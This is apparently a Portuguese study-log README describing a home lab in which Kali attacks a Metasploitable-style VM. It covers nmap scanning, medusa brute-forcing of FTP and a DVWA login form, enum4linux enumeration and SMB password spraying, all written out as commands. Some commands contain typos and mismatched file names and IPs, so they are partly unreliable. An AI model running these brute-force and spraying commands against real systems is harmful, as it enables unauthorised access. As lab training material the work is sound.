<img width="2511" height="1018" alt="image" src="https://github.com/user-attachments/assets/ef22b817-6964-4ce1-afc3-0212430e747c" /># EstudosCyber
Hub de estudos em cybersegurança


--------------------------------------------------CRIAR VMS-------------------------------------------------------------

Iniciei o processo a construcao de 2 maquinas virtuais.
A primeira maquina virtual com o kali linux e a segunda com uma maquina para testes internos, chamada de MetaEx (baseado no metasploited 2)
Após breve configuração, executei um ping para verificar se as 2 maquinas estavam na mesma rede.

No Kali
ping -c 3 192.168.16.101 (ip da vm meta)
Me retornou que sim, estamos em sintonia

Proxima fase é descobrir quais portas estao abertas, com isso vamos utilizar o comando nmap:
nmap -sV -p 21,22,80,445,139 192.168.16.101

Esse comando vai escanear as portas
Com esse comando, recebemos a informação de que a porta 21/tvp esta aberta e rodando a versao 2.3.4, a porta 80 e as portas 139 e 445 do smd tbm estao abertas.

Proximo passo foi conectar no ftp usando o comando:
ftp 192.168.56.101, com isso conseguimos conectar mas ainda nao sabemos o user e a senha.

--------------------------------------------------ACESSO FTP--------------------------------------------------------------------
Entao para executar um acesso com bruteforcem criei um arquivo txt de usuarios com o comando
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

criei tbm o arquivo de senhas com o comando
echo -e "123456\nmsfadmin\nadmin\nroot" > users.txt

agora vou atacar o ftp com o comando
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
com isso pude ver que houve sucesso com o user msfadmin e senha msfadmin

--------------------------------------------------DVWA-----------------------------------------------------------------------------
Agora vou explorar outra falha que é o preenchimento de formularios de login e senha com o DVWA

Para isso, acessei pelo navegador firefox o endereço 192.168.56.101/dvwa/login.php
Ao acessar a pagina, precisei entender como que é o processo interno e entrei na aba de desenvolvedor pelo comando F12 do teclado
Apos isso, cliquei em network e preenchi qq nome de usuario e senha

Com esse teste ja consigo ver os parametros que o site usa para o login, que sao:
username, password e Login

Para esse processo, será necessario a criação de worldlists

Para criação da lista de usuarios, criei com o comando
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

Criei tbm o arquivo de senhas com o comando
echo -e "123456\nmsfadmin\nadmin\nroot" > users.txt

Como ja criei anteriormente, ja vou utilizar eles no proximo ataque de bruteforce com o medusa

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'dvwa/login.php' \
-m FORM:'usernamne=^USER^&password=PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

Com isso encotrei a credencial de login user e senha password, dando acesso ao site

--------------------------------------------------ENUMERACAO SPRAY-------------------------------------------------------------------
Nessa fase vou fazer um ataque em um serviço smb (arquivos e pastas, por exemplo), usando password spraying

Usei o seguinte comando
enum4linux -a 192.168.56.101 | tee enum4_output.txt (O tee serve para gravar o conteudo em um arquivo)

Apos rodar o comando, acessei os dados com o comando
less enum4_output.txt

Nesse arquivo, pude notar os nomes de usuarios reais e com eles que farei o ataque

Para criação da lista de usuarios, criei com o comando
echo -e "user\nmsfadmin\services" > smb_users.txt

Criei tbm o arquivo de senhas com o comando
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

Agora com as listas criadas, executei o seguinte comando
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbbt -t 2 -T 50

Encontrei o user msfadmin com senha msfadmin e esse usuario tem privilegios de administrador

Para testar, usei o comando
smbclient -L //192.168.56.101 -U msfadmin
Abriu um pedido de senha e como vi anteriormente a usei a senha msfadmin para concluir o login
